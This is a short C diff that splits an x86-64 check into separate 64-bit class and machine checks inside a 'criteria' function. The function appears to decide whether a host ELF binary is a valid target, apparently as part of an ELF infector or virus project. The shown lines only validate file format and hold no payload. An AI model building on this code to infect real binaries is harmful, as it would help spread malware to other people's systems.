@@ -14,9 +14,14 @@ __attribute__((always_inline)) static inline bool is_elf(const struct s_host *ho
 	return *(uint32_t *)host->header == ELF_MAGIC_NUMBER;
 }
 
-__attribute__((always_inline)) static inline bool is_x86_64(const struct s_host *host)
+__attribute__((always_inline)) static inline bool is_64(const struct s_host *host)
 {
-	return host->header->e_ident[EI_CLASS] == X86_64_MAGIC_NUMBER;
+	return host->header->e_ident[EI_CLASS] == ELFCLASS64;
+}
+
+__attribute__((always_inline)) static inline bool is_x86(const struct s_host *host)
+{
+	return host->header->e_machine == EM_X86_64;
 }
 
 __attribute__((always_inline)) static inline bool is_executable(const struct s_host *host)
@@ -54,7 +59,12 @@ void criteria(struct s_host *host, struct s_keychain *keychain, enum e_context c
 		context = FAILURE;
 		goto label;
 	}
-	if (is_x86_64(host) == false)
+	if (is_64(host) == false)
+	{
+		context = FAILURE;
+		goto label;
+	}
+	if (is_x86(host) == false)
 	{
 		context = FAILURE;
 		goto label;
